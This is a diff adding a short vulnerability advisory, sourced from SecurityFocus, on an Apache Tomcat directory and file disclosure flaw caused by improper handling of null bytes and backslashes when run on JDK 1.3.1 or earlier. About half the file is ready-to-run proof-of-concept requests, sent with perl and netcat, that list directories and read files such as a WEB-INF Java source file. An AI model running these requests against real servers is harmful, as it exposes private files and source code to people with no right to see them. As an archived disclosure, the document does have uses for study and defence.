@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/6721/info
+
+Apache Tomcat is prone to a directory/file disclosure vulnerability when used with JDK 1.3.1 or earlier.
+
+It has been reported that remote attackers may view directory contents (even when an 'index.html' or other welcome file). It is also possible for remote attackers to disclose the contents of files.
+
+This vulnerability is due to improper handling of null bytes (%00) and backslash ('\') characters in requests for web resources.
+
+GET /<null byte>.jsp HTTP/1.0
+$ perl -e 'print "GET /\x00.jsp HTTP/1.0\r\n\r\n";' | nc my.server 8080
+$ perl -e 'print "GET /admin/WEB-INF\\classes/ContextAdmin.java\x00.jsp HTTP/1.0\r\n\r\n";'|nc my.server 8080
+$ perl -e 'print "GET /examples/jsp/cal/cal1.jsp\x00.html HTTP/1.0\r\n\r\n";'|nc my.server 8080
